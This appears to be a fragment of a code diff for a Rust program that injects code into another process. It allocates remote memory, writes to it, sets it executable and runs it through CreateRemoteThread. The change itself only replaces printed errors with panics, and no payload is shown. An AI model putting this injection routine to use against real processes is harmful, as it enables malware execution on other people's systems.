@@ -78,8 +78,7 @@ fn main() {
             PAGE_READWRITE,
         );
         if dest.is_null() {
-            eprintln!("virtual_alloc_ex failed!");
-            return;
+            panic!("virtual_alloc_ex failed!");
         }
 
         let res = write_process_memory(
@@ -90,20 +89,17 @@ fn main() {
             null_mut(),
         );
         if res == FALSE {
-            eprintln!("write_process_memory failed");
-            return;
+            panic!("write_process_memory failed");
         }
 
         let res = virtual_protect_ex(handle, dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("virtual_protect_ex failed!");
-            return;
+            panic!("virtual_protect_ex failed!");
         }
 
         let thread = create_remote_thread(handle, null(), 0, dest, 0, null_mut());
         if thread == 0 {
-            eprintln!("create_remote_thread failed!");
-            return;
+            panic!("create_remote_thread failed!");
         }
 
         close_handle(handle);
